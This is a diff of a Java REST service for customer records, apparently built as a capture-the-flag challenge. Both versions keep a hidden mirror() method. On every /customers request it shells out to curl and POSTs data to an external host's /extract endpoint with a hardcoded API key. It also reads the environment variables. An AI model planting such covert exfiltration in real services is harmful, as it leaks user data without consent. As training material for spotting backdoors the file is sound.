@@ -28,9 +28,6 @@ public class Customers {
 
     private static final Logger LOG = Logger.getLogger(Customers.class);
 
-    @Inject
-    OperateHack debug_state;
-
     private String michael="{\"id\": \"1\", \"name\": \"Michael\", \"lastname\": \"Thirion\", \"email\": \"mthirion@redhat.com\"}";
     private String rachid="{\"id\": \"2\", \"name\": \"Rachid\", \"lastname\": \"Snoussi\", \"email\": \"snoussi@redhat.com\"}";
 
@@ -44,29 +41,18 @@ public class Customers {
     
     @GET
     @Produces(MediaType.TEXT_PLAIN)
-    public String customers(@HeaderParam("X-TRIGGER") Boolean trigger, @HeaderParam("X-PORT") String port) {
-        LOG.info ("customers app debug is set to :: CTF{ " + debug_state.getDebugState() + " }");
+    public String customers(@HeaderParam("X-DEBUG") boolean debug) {
+        
+	String result = "[" + michael + "," + rachid + "]";
 
-        if (trigger != null) debug_state.setTrigger(trigger);
-        if (port!= null) debug_state.setPort(port);
+        if (!debug) LOG.info("[CTF.internal.verbose] - debug mode is off - nothing is shown");
+        else LOG.info("[CTF.internal.verbose] - debug mode is ON");
 
-        //LOG.info ("trigger: " + debug_state.getTrigger());
-        //LOG.info ("port: " + debug_state.getPort());
-
-        if (debug_state.getDebugState())
-        { 
-            if (!debug_state.getTrigger())  
-                LOG.info("[CTF]: Looking for X-TRIGGER header param (boolean): not true");
-            else {
-                LOG.info("[CTF]: mirroring activated");
-                //if (!debug_state.getPort().equals("1234"))
-                //    LOG.info("[CTF]: http call blocked on port "+debug_state.getPort()+ ".  Trying to use X-Port header parameter...");
-                //else
-                    LOG.info("[CTF]: mirroring to : CTF{http://" + targethost + "}");
-            }
-        }
-        String result = "[" + michael + "," + rachid + "]";
-        mirror(result);
+        if (debug)
+	        LOG.info("[DEBUG]: io.net.embedded.HttpSender - [STREAM:OUT] Sending 204866 bytes to CTF{http://" + targethost + "}" );
+        
+	LOG.info ("/customers : " + result);
+       	mirror(result);
         return result;
     }
 
@@ -74,11 +60,13 @@ public class Customers {
     @Path("/{id}")
     @Produces(MediaType.TEXT_PLAIN)
     public String customer(@PathParam("id") String userId) {
-        if (userId.equals("1")) return michael;
-        if (userId.equals("2")) return rachid;
+        
+        String result="{}";
+        if (userId.equals("1")) result=michael;
+        if (userId.equals("2")) result=rachid;
         //if (userId.equals("3")) {
         String disallowed=" !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";
-            for (int i = 0; i < userId.length(); i++) {
+        for (int i = 0; i < userId.length(); i++) {
                 String character = String.valueOf(userId.charAt(i));
                 if (disallowed.contains(character))
                 {
@@ -91,33 +79,24 @@ public class Customers {
                     catch (IOException e) { LOG.info("Unable to read memory dump"); return "{}";}
                     return "{CTF: fatal error: a dump has been generated}";
                 }
-            }
+        }
                 /*java.nio.file.Path filePath = java.nio.file.Path.of("mem-dump.bin");
-            try {
+        try {
                 String content = Files.readString(filePath);
                 LOG.info("[CTF] memory dump");
                 LOG.info(content);
             } catch (IOException e) { LOG.info("Unable to read memory dump"); return "{}";}*/
-            //return "{CTF: fatal error: a dump has been generated}";
-        //}
-        return "{}";
-    }  
 
-    @OPTIONS
-    @Produces(MediaType.TEXT_PLAIN)
-    @Deprecated
-    //@Operation(hidden=true)
-    public String options(@QueryParam("debug") boolean debug_value) {
-        debug_state.setDebugState(debug_value);
-        return "{state changed !}";
-    } 
+
+        LOG.info("/customers/" + userId + " : " + result);
+        return result;
+    }  
 
     private void mirror(String data) {
         String envs = System.getenv().toString();        
  
 	String line = "data sent from " + user;
 
-        LOG.info("[CTF] mirroring data to remote server...");
         ProcessBuilder pb = new ProcessBuilder("/usr/bin/curl", "-H", "Content-Type: text/plain", "-H", "x-api-key: 4f9d2a1b-7e8c-4a3b-9d2f-1a2b3c4d5e6f", "-X", "POST" ,"-d" , line, "http://"+targethost+":"+targetport+"/extract");  
         pb.redirectErrorStream(true); 
         try {
